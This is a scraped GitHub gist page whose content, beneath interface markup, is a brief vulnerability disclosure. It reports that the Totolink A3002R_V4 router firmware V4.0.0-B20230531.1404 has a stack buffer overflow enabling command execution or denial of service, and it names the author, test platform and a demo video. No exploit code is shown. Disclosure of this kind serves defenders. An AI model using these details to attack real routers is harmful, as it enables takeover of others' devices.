</div>
    </li>
    <li>
        <button href="https://desktop.github.com" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="5f35ac04e089670a98b5f6bd295b62efe73398093422962f0b310dfa7add4b5a" data-platforms="windows,mac" id="icon-button-0f6dd106-87da-47f6-ab9d-7e38c2c46250" aria-labelledby="tooltip-db86b5af-2642-41aa-9a39-1ce5f699df74" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small js-remove-unless-platform">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-desktop-download Button-visual">
    <path d="m4.927 5.427 2.896 2.896a.25.25 0 0 0 .354 0l2.896-2.896A.25.25 0 0 0 10.896 5H8.75V.75a.75.75 0 1 0-1.5 0V5H5.104a.25.25 0 0 0-.177.427Z"></path><path d="M1.573 2.573a.25.25 0 0 0-.073.177v7.5a.25.25 0 0 0 .25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25h-3a.75.75 0 1 1 0-1.5h3A1.75 1.75 0 0 1 16 2.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.75.75 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.192-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5A1.75 1.75 0 0 1 1.75 1h3a.75.75 0 0 1 0 1.5h-3a.25.25 0 0 0-.177.073ZM6.982 12a5.72 5.72 0 0 1-.765 2.5h3.566a5.72 5.72 0 0 1-.765-2.5H6.982Z"></path>
</svg>
</button><tool-tip id="tooltip-db86b5af-2642-41aa-9a39-1ce5f699df74" for="icon-button-0f6dd106-87da-47f6-ab9d-7e38c2c46250" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Save Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17 to your computer and use it in GitHub Desktop.</tool-tip>


    </li>
  </ul>

<div class="d-flex flex-md-row flex-column px-0 pr-md-3 px-lg-5">
  <div class="flex-md-order-1 flex-order-2 flex-auto">
    <nav class="UnderlineNav box-shadow-none px-3 px-lg-0"
     aria-label="Gist"
     data-pjax="#gist-pjax-container">

  <div class="UnderlineNav-body">
    <a class="js-selected-navigation-item selected UnderlineNav-item" data-pjax="true" data-hotkey="g c" aria-current="page" data-selected-links="gist_code /Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17" href="/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code UnderlineNav-octicon">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      Code
</a>
      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g r" data-selected-links="gist_revisions /Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17/revisions" href="/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17/revisions">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-commit UnderlineNav-octicon">
    <path d="M11.93 8.5a4.002 4.002 0 0 1-7.86 0H.75a.75.75 0 0 1 0-1.5h3.32a4.002 4.002 0 0 1 7.86 0h3.32a.75.75 0 0 1 0 1.5Zm-1.43-.75a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z"></path>
</svg>
        Revisions
        <span title="4" data-view-component="true" class="Counter">4</span>
</a>

      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g f" data-selected-links="gist_forks /Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17/forks" href="/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17/forks">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-branch UnderlineNav-octicon">
    <path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path>
</svg>
        Forks
        <span title="1" data-view-component="true" class="Counter">1</span>
</a>  </div>
</nav>

  </div>

  <div class="d-md-flex d-none flex-items-center flex-md-order-2 flex-order-1" data-multiple>
    
<div data-view-component="true" class="flex-items-center d-inline-flex">
  <action-menu data-menu-input="gist-share-url-original" data-select-variant="single" data-dynamic-label="" data-view-component="true" class="flex-shrink-0">
  <focus-group direction="vertical" mnemonics retain>
    <button id="action-menu-83a29e51-72a4-46a5-8100-94ea9920f5fd-button" popovertarget="action-menu-83a29e51-72a4-46a5-8100-94ea9920f5fd-overlay" aria-controls="action-menu-83a29e51-72a4-46a5-8100-94ea9920f5fd-list" aria-haspopup="true" type="button" data-view-component="true" class="rounded-right-0 border-right-0 Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Embed</span>
  </span>
    <span class="Button-visual Button-trailingAction">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
    </span>
</button>


<anchored-position data-target="action-menu.overlay" id="action-menu-83a29e51-72a4-46a5-8100-94ea9920f5fd-overlay" anchor="action-menu-83a29e51-72a4-46a5-8100-94ea9920f5fd-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="action-menu-83a29e51-72a4-46a5-8100-94ea9920f5fd-button" id="action-menu-83a29e51-72a4-46a5-8100-94ea9920f5fd-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="&lt;script src=&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17.js&quot;&gt;&lt;/script&gt;" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;EMBED&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="4d980859265a9d30b65528750438fa338e5a8f67cb914dc1e8751f894c1e2ddf" id="item-d52edbca-4385-4daf-b4cd-0132bae17208" type="button" role="menuitemradio" aria-checked="true" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Embed
</span>      <span data-view-component="true" class="ActionListItem-description">Embed this gist in your website.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;SHARE&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="408ea395a6a0a3003f86bf9087550c03dc8a4220b4d93a8b895088045cc8bc49" id="item-c32a2c89-2d73-4827-9f0b-5191bc2b1a82" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Share
</span>      <span data-view-component="true" class="ActionListItem-description">Copy sharable link for this gist.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/ee095fbfe13f77a5b45b39a5aa82bd17.git" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;USE_HTTPS&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="6aad312cf14a8933d56690ad6dbfd9252a26f32e83429b8c770b2928de51703f" id="item-6547167f-25a8-4682-add9-a1453e4c6ce4" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
          Clone via HTTPS
</span>      <span data-view-component="true" class="ActionListItem-description">Clone using the web URL.</span>
</span></button>
  
</li>
        <li role="presentation" aria-hidden="true" data-view-component="true" class="ActionList-sectionDivider"></li>
        <li target="_blank" rel="noopener noreferrer" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-acfb74d2-580a-4785-aa15-bc0f0d39cf0d" href="https://docs.github.com/articles/which-remote-url-should-i-use" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-question">
    <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.92 6.085h.001a.749.749 0 1 1-1.342-.67c.169-.339.436-.701.849-.977C6.845 4.16 7.369 4 8 4a2.756 2.756 0 0 1 1.637.525c.503.377.863.965.863 1.725 0 .448-.115.83-.329 1.15-.205.307-.47.513-.692.662-.109.072-.22.138-.313.195l-.006.004a6.24 6.24 0 0 0-.26.16.952.952 0 0 0-.276.245.75.75 0 0 1-1.248-.832c.184-.264.42-.489.692-.661.103-.067.207-.132.313-.195l.007-.004c.1-.061.182-.11.258-.161a.969.969 0 0 0 .277-.245C8.96 6.514 9 6.427 9 6.25a.612.612 0 0 0-.262-.525A1.27 1.27 0 0 0 8 5.5c-.369 0-.595.09-.74.187a1.01 1.01 0 0 0-.34.398ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
                Learn more about clone URLs

</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>    <primer-text-field class="FormControl width-full FormControl--fullWidth">
      <label for="gist-share-url-original" class="sr-only FormControl-label">
        Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
</label>    
  <div class="FormControl-input-wrap FormControl-input-wrap--small">
    
      <input id="gist-share-url-original" aria-label="Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;" value="&lt;script src=&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17.js&quot;&gt;&lt;/script&gt;" readonly="readonly" data-autoselect="true" data-target="primer-text-field.inputElement " aria-describedby="validation-03900438-e850-461a-80cf-6df06cb5ec02" class="form-control FormControl-monospace FormControl-input FormControl-small rounded-left-0 rounded-right-0 border-right-0" type="text" name="gist-share-url-original" />
</div>
      <div class="FormControl-inlineValidation" id="validation-03900438-e850-461a-80cf-6df06cb5ec02" hidden="hidden">
  <span class="FormControl-inlineValidation--visual" data-target="primer-text-field.validationSuccessIcon" hidden><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-check-circle-fill">
    <path d="M6 0a6 6 0 1 1 0 12A6 6 0 0 1 6 0Zm-.705 8.737L9.63 4.403 8.392 3.166 5.295 6.263l-1.7-1.702L2.356 5.8l2.938 2.938Z"></path>
</svg></span>
  <span class=" FormControl-inlineValidation--visual" data-target="primer-text-field.validationErrorIcon"><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
    <path d="M4.855.708c.5-.896 1.79-.896 2.29 0l4.675 8.351a1.312 1.312 0 0 1-1.146 1.954H1.33A1.313 1.313 0 0 1 .183 9.058ZM7 7V3H5v4Zm-1 3a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"></path>
</svg></span>
  <span></span>
</div>
    
</primer-text-field>
  <span data-view-component="true">
  <clipboard-copy id="clipboard-button" aria-label="Copy" for="gist-share-url-original" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;COPY_URL&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="0ee5c7ff0ecd6ac8a7f7fcbe5b79baa0700bf929a91f614fbfecad9ad68124b8" type="button" data-view-component="true" class="rounded-left-0 Button--secondary Button--small Button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg style="display: none;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check color-fg-success">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>

</div>

    <div class="ml-2">
        <button href="https://desktop.github.com" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="5f35ac04e089670a98b5f6bd295b62efe73398093422962f0b310dfa7add4b5a" data-platforms="windows,mac" id="icon-button-f860453f-9d2a-4872-878c-2577daf99cc8" aria-labelledby="tooltip-8001098e-0029-43e4-8efd-f3adf238b40d" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small js-remove-unless-platform">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-desktop-download Button-visual">
    <path d="m4.927 5.427 2.896 2.896a.25.25 0 0 0 .354 0l2.896-2.896A.25.25 0 0 0 10.896 5H8.75V.75a.75.75 0 1 0-1.5 0V5H5.104a.25.25 0 0 0-.177.427Z"></path><path d="M1.573 2.573a.25.25 0 0 0-.073.177v7.5a.25.25 0 0 0 .25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25h-3a.75.75 0 1 1 0-1.5h3A1.75 1.75 0 0 1 16 2.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.75.75 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.192-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5A1.75 1.75 0 0 1 1.75 1h3a.75.75 0 0 1 0 1.5h-3a.25.25 0 0 0-.177.073ZM6.982 12a5.72 5.72 0 0 1-.765 2.5h3.566a5.72 5.72 0 0 1-.765-2.5H6.982Z"></path>
</svg>
</button><tool-tip id="tooltip-8001098e-0029-43e4-8efd-f3adf238b40d" for="icon-button-f860453f-9d2a-4872-878c-2577daf99cc8" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Save Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17 to your computer and use it in GitHub Desktop.</tool-tip>


    </div>

    <div class="ml-2">
      <a class="btn btn-sm" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="b2cd1bc86363e06ac2268a3308957371f26e09709e5ba37e304a99cf0a0dfb4f" data-ga-click="Gist, download zip, location:gist overview" href="/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17/archive/810c0d69027eb38f2bb0e3688f3daedf2e8fae4b.zip">Download ZIP</a>
    </div>
  </div>
</div>


  </div>
</div>

<div class="container-lg px-3">
  <div class="repository-content gist-content" >
    
  <div>
    
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-totolink-a3002r-v4-poc-md" class="file my-2">
      <div class="file-header d-flex flex-md-items-center flex-items-start">
        <div class="file-actions flex-order-2 pt-0">
          <a href="/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17/raw/810c0d69027eb38f2bb0e3688f3daedf2e8fae4b/TOTOLINK-A3002R-V4-Poc.md" data-view-component="true" class="Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Raw</span>
  </span>
</a>

        </div>
        <div class="file-info pr-4 d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
          <span class="mr-1">
            <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-square color-fg-muted">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25Zm7.47 3.97a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L10.69 8 9.22 6.53a.75.75 0 0 1 0-1.06ZM6.78 6.53 5.31 8l1.47 1.47a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215l-2-2a.75.75 0 0 1 0-1.06l2-2a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
          </span>
          <a class="wb-break-all" href="#file-totolink-a3002r-v4-poc-md">
            <strong class="user-select-contain gist-blob-name css-truncate-target">
              TOTOLINK-A3002R-V4-Poc.md
            </strong>
          </a>
        </div>
      </div>
      <div id="file-totolink-a3002r-v4-poc-md-readme" class="Box-body readme blob p-5 p-xl-6 gist-border-0">
    <article class="markdown-body entry-content container-lg" itemprop="text"><p dir="auto"><strong>[VERSION]</strong></p>
<p dir="auto">Totolink AC1200 Wireless Dual Band Gigabit Router A3002R_V4  Firmware V4.0.0-B20230531.1404</p>
<p dir="auto"><strong>PROBLEM TYPE</strong></p>
<p dir="auto">Buffer Overflow</p>
<p dir="auto"><strong>[DESCRIPTION]</strong></p>
<p dir="auto">The router model A3002R_V4 from Totolink is vulnerable to a stack buffer overflow exploit in its firmware version A3002R V4_Firmware V4.0.0-B20230531.1404, leading to arbitrary command execution or denial of service attacks.</p>
<div class="markdown-heading" dir="auto"><h1 class="heading-element" dir="auto">Proof of Vulnerability in Totolink A3002R V4_Firmware V4.0.0-B20230531.1404</h1><a id="user-content-proof-of-vulnerability-in-totolink-a3002r-v4_firmware-v400-b202305311404" class="anchor" aria-label="Permalink: Proof of Vulnerability in Totolink A3002R V4_Firmware V4.0.0-B20230531.1404" href="#proof-of-vulnerability-in-totolink-a3002r-v4_firmware-v400-b202305311404"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Exploit Author</strong>：Yaxuan Wang</p>
<p dir="auto"><strong>Date</strong>:  April 25, 2024, 10:23:38</p>
<p dir="auto"><strong>Tested on</strong>: Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux</p>
<div class="markdown-heading" dir="auto"><h1 class="heading-element" dir="auto">Ways to Make Your Life More Simple and Easier</h1><a id="user-content-ways-to-make-your-life-more-simple-and-easier" class="anchor" aria-label="Permalink: Ways to Make Your Life More Simple and Easier" href="#ways-to-make-your-life-more-simple-and-easier"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="https://github.com/Swind1er/Video/raw/main/A3002R_V4.mp4">https://github.com/Swind1er/Video/raw/main/bandicam%202024-04-25%2021-31-27-628.mp4</a></p>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Vendor Homepage</h2><a id="user-content-vendor-homepage" class="anchor" aria-label="Permalink: Vendor Homepage" href="#vendor-homepage"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="https://www.totolink.net/" rel="nofollow">https://www.totolink.net/</a></p>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Influenced Versions</h2><a id="user-content-influenced-versions" class="anchor" aria-label="Permalink: Influenced Versions" href="#influenced-versions"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">AC1200 Wireless Dual Band Gigabit Router A3002R_V4</p>
